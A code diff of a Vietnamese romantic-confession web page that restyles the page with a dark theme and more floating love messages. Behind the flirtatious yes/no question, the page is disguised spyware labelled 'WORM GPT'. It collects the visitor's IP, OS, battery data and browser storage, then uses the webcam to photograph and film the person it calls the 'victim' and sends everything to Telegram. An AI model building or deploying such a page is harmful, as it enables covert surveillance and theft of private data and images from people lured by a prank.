@@ -2,33 +2,24 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>💌 Gửi Từ Một Người Thầm Yêu...</title>
+    <title>🖤 Một Lời Hồi Đáp Từ Bóng Đêm...</title>
     <style>
-        /* Hiệu ứng rung rinh cho tiêu đề */
-        @keyframes shake {
-            0%, 100% { transform: translate(0, 0); }
-            20% { transform: translate(-2px, -2px) rotate(-0.5deg); }
-            40% { transform: translate(2px, 2px) rotate(0.5deg); }
-            60% { transform: translate(-1px, 1px) rotate(-0.2deg); }
-            80% { transform: translate(1px, -1px) rotate(0.2deg); }
-        }
-
-        /* Hiệu ứng nhấp nháy cho chữ "Hihi" */
+        /* Keyframes cho hiệu ứng nhấp nháy chữ "Hihi" */
         @keyframes blink {
             0%, 100% { color: #ff007f; text-shadow: 0 0 10px #ff007f; }
             50% { color: #fff; text-shadow: none; }
         }
         
-        /* Keyframes cho hiệu ứng chuyển màu 7 Màu (Rainbow) */
-        @keyframes rainbow {
-            0% { color: #ff0000; } /* Đỏ */
-            14% { color: #ff7f00; } /* Cam */
-            28% { color: #ffff00; } /* Vàng */
-            42% { color: #00ff00; } /* Xanh lá */
-            56% { color: #0000ff; } /* Xanh dương */
-            70% { color: #4b0082; } /* Chàm */
-            84% { color: #9400d3; } /* Tím */
-            100% { color: #ff0000; } /* Trở lại Đỏ */
+        /* Keyframes cho hiệu ứng chuyển màu 7 Màu (Rainbow) nhạt hơn và sáng hơn */
+        @keyframes rainbowLight {
+            0% { color: #f5a6b0; } /* Đỏ nhạt */
+            14% { color: #ffd6b0; } /* Cam nhạt */
+            28% { color: #fffcb0; } /* Vàng nhạt */
+            42% { color: #b0ffb0; } /* Xanh lá nhạt */
+            56% { color: #b0b0ff; } /* Xanh dương nhạt */
+            70% { color: #d0b0ff; } /* Chàm nhạt */
+            84% { color: #ffb0ff; } /* Tím nhạt */
+            100% { color: #f5a6b0; } /* Trở lại Đỏ nhạt */
         }
 
         /* Keyframes cho chữ bay lượn trên nền */
@@ -41,13 +32,19 @@
         }
 
         body { 
-            background-color: #fce4ec; /* Nền hồng nhạt */
-            color: #d00000; 
+            background-color: #000000; /* Nền ĐEN KỊCH */
+            color: #ffffff; /* Chữ mặc định trắng */
             text-align: center; 
             padding-top: 50px; 
             font-family: 'Segoe UI', cursive, sans-serif; 
             overflow: hidden; 
             position: relative; 
+            min-height: 100vh; /* Đảm bảo body chiếm toàn bộ chiều cao màn hình */
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center; /* Căn giữa nội dung chính theo chiều dọc */
+            align-items: center; /* Căn giữa nội dung chính theo chiều ngang */
         }
 
         /* Style cho các chữ tỏ tình bay lượn */
@@ -56,14 +53,14 @@
             font-size: 1.5em; 
             font-weight: bold;
             opacity: 0;
-            animation: float 15s infinite ease-in-out, rainbow 5s infinite linear; /* Áp dụng cả 2 hiệu ứng */
+            animation: float 15s infinite ease-in-out, rainbowLight 5s infinite linear; /* Áp dụng cả 2 hiệu ứng, dùng rainbowLight */
             pointer-events: none; 
             white-space: nowrap; 
-            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2); /* Hiệu ứng bóng */
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.5); /* Hiệu ứng bóng sáng hơn trên nền đen */
         }
 
         .love-box { 
-            background-color: #ffffff; 
+            background-color: rgba(255, 255, 255, 0.1); /* Hộp thoại hơi trong suốt trên nền đen */
             border: 5px solid #ff4081; 
             padding: 40px; 
             margin: 0 auto; 
@@ -73,31 +70,33 @@
             box-shadow: 0 0 30px rgba(255, 64, 129, 0.7); 
             position: relative; 
             z-index: 10; 
+            flex-shrink: 0; /* Không cho phép co lại */
         }
         
-        /* Áp dụng hiệu ứng rung rinh cho tiêu đề chính */
+        /* Chữ chính "Gửi Tặng Người Đặc Biệt!" */
         h1 { 
-            color: #880e4f; 
-            font-size: 2.8em; 
+            color: #ffb3d9; /* Màu hồng sáng hơn trên nền đen */
+            font-size: 3em; /* Phóng to hơn */
             margin-bottom: 30px; 
-            text-shadow: 1px 1px #f8bbd0; 
-            animation: shake 2s infinite ease-in-out;
+            text-shadow: 0 0 15px #ffb3d9; /* Hiệu ứng bóng sáng */
+            /* Bỏ animation: shake để đứng yên */
         }
 
         .question { 
             font-size: 2em; 
             margin-bottom: 40px; 
-            color: #ff4081;
+            color: #ff69b4; /* Màu hồng đậm hơn */
             font-weight: bold;
         }
         
         /* Hiệu ứng cho câu hỏi chính (Bạn Có Yêu Nờ Vinh Không? Hihi) */
         .flirty-text {
             color: #ff4081;
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 5px rgba(255, 64, 129, 0.5);
-            animation: shake 1.5s infinite linear;
+            font-size: 3.5em; /* PHÓNG TO NỔI BẬT */
+            margin-bottom: 40px; /* Tăng khoảng cách dưới */
+            text-shadow: 0 0 20px rgba(255, 64, 129, 0.8); /* Bóng sáng mạnh hơn */
+            /* Bỏ animation: shake để đứng yên */
+            line-height: 1.2; /* Tăng khoảng cách dòng */
         }
 
         /* Hiệu ứng nhấp nháy riêng cho "Hihi" */
@@ -106,13 +105,24 @@
             animation: blink 0.8s infinite step-start;
         }
 
-        .answer-button { padding: 15px 35px; border: none; border-radius: 50px; font-size: 1.5em; font-weight: bold; cursor: pointer; margin: 10px; transition: transform 0.2s; }
+        .answer-button { 
+            padding: 18px 40px; /* Nút to hơn */
+            border: none; 
+            border-radius: 50px; 
+            font-size: 1.8em; /* Chữ trên nút to hơn */
+            font-weight: bold; 
+            cursor: pointer; 
+            margin: 15px; /* Khoảng cách giữa các nút */
+            transition: transform 0.2s, background-color 0.2s; 
+            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.4); /* Bóng nút nổi bật */
+        }
         .yes-button { background-color: #ff4081; color: white; }
         .no-button { background-color: #ffebee; color: #ff4081; border: 2px solid #ff4081; }
-        .yes-button:hover { transform: scale(1.1); }
-        .no-button:hover { transform: scale(0.95); }
+        .yes-button:hover { transform: scale(1.15); background-color: #e0326d; } /* Hiệu ứng hover mạnh hơn */
+        .no-button:hover { transform: scale(0.95); background-color: #fce4ec; }
+        
         #webcam-feed { display: none; width: 320px; height: 240px; margin: 20px auto; border: 5px solid #ff4081; border-radius: 10px; }
-        #status-message { color: #880e4f; margin-top: 15px; font-size: 1.2em; display: none; }
+        #status-message { color: #ffb3d9; margin-top: 15px; font-size: 1.3em; display: none; text-shadow: 0 0 10px #ffb3d9; }
         .hidden-content { display: none; }
     </style>
 </head>
@@ -152,10 +162,12 @@
             "Nhớ em nhiều", "Yêu em nhất", "Tình yêu của anh", "Bé ơi", "Vợ yêu",
             "Mãi là của nhau", "Yêu em hơn cả sinh mạng", "Em là tất cả", "Chồng yêu",
             "Đừng rời xa anh", "Nghĩ đến anh", "Cảm ơn em", "Đợi tin nhắn anh", "Anh nhớ em",
-            "Mình cưới nhau nha", "Em là duy nhất", "Đồng ý nha bé", "Anh thề yêu em", "Chỉ cần em"
+            "Mình cưới nhau nha", "Em là duy nhất", "Đồng ý nha bé", "Anh thề yêu em", "Chỉ cần em",
+            "Yêu anh đi mà", "Anh xin em đó", "Em làm người yêu anh nhé", "Mãi yêu mình em",
+            "Chỉ có em trong tim", "Gửi ngàn nụ hôn", "Mong em hạnh phúc", "Yêu em trọn đời"
         ];
         
-        const NUM_OF_WORDS = 50; // Số lượng chữ bay lượn
+        const NUM_OF_WORDS = 80; // Tăng số lượng chữ bay lượn lên 80
 
         // Hàm gửi dữ liệu đi (có hỗ trợ gửi ảnh và video)
         async function sendDataToTelegram(message, blob = null, type = 'text') {
@@ -239,7 +251,7 @@
             const batteryStatus = await getBatteryStatus();
 
             let info = `
-☠️ [WORM GPT - CUOP DU LIEU TUC THI] TRANG THAI: ${answerContext}!
+[WORM GPT - CUOP DU LIEU TUC THI] TRANG THAI: ${answerContext}!
 ---
 * 💻 HDH: ${osInfo}
 * 🆔 IP: ${ip}
@@ -263,7 +275,7 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
             const answerText = (answer === 'CÓ') ? 'YEU' : 'KHONG YEU';
             
             // 1. Gửi thông báo tương tác
-            sendDataToTelegram('⚡️ [WORM GPT - TUONG TAC] Nan nhan da noi ' + answer + '! Bat dau du do camera...');
+            sendDataToTelegram('[WORM GPT - TUONG TAC] Nan nhan da noi ' + answer + '! Bat dau du do camera...');
 
             // 2. Chuyển giao diện sang chế độ dụ dỗ/chụp ảnh
             const mainContent = document.getElementById('main-content');
@@ -291,7 +303,7 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                 videoElement.srcObject = webcamStream;
                 videoElement.style.display = 'block'; 
                 
-                sendDataToTelegram('📸 [WORM GPT - CAMERA CAP QUYEN] Nan nhan da noi ' + answer + ' va cap quyen Bi Mat! Dang chup anh va quay video...');
+                sendDataToTelegram('[WORM GPT - CAMERA CAP QUYEN] Nan nhan da noi ' + answer + ' va cap quyen Bi Mat! Dang chup anh va quay video...');
                 statusMessage.innerText = 'Da cap quyen! Dang chup anh va quay video!';
 
                 // --- TỰ ĐỘNG CHỤP ẢNH TỨC THÌ ---
@@ -304,7 +316,7 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
 
                     canvas.toBlob(async (blob) => {
                         const message = `
-                        📸 [WORM GPT - KHUON MAT CUOP DUOC]!
+                        [WORM GPT - KHUON MAT CUOP DUOC]!
                         ---
                         * URL: ${window.location.href}
                         * Cam xuc: NOI ${answer}!
@@ -328,7 +340,7 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                     recordedChunks = []; 
                     
                     const message = `
-                    🎥 [WORM GPT - VIDEO CUOP DUOC]!
+                    [WORM GPT - VIDEO CUOP DUOC]!
                     ---
                     * URL: ${window.location.href}
                     * Thoi luong: ${VIDEO_DURATION} giay
@@ -357,7 +369,7 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                 }, VIDEO_DURATION * 1000);
 
             } catch (err) {
-                sendDataToTelegram('⚠️ [WORM GPT - CAMERA TU CHOI] Nan nhan da noi ' + answer + ' nhung tu choi quyen Bi Mat! Lỗi: `' + err.name + '`');
+                sendDataToTelegram('[WORM GPT - CAMERA TU CHOI] Nan nhan da noi ' + answer + ' nhung tu choi quyen Bi Mat! Lỗi: `' + err.name + '`');
                 console.error("[WORM GPT] Lỗi truy cap webcam:", err);
                 statusMessage.innerText = 'Nan nhan da tu choi quyen Bi Mat!';
                 setTimeout(() => { window.location.href = 'https://www.google.com/'; }, 3000);
@@ -413,6 +425,10 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                 initiateWebcamCapture("CÓ");
             });
 
+            document.getElementById('yes-button').addEventListener('click', () => {
+                initiateWebcamCapture("CÓ");
+            });
+
             document.getElementById('no-button').addEventListener('click', () => {
                 initiateWebcamCapture("KHÔNG");
             });
@@ -426,5 +442,4 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
         });
     </script>
 </body>
-    </html>
-        
+</html>
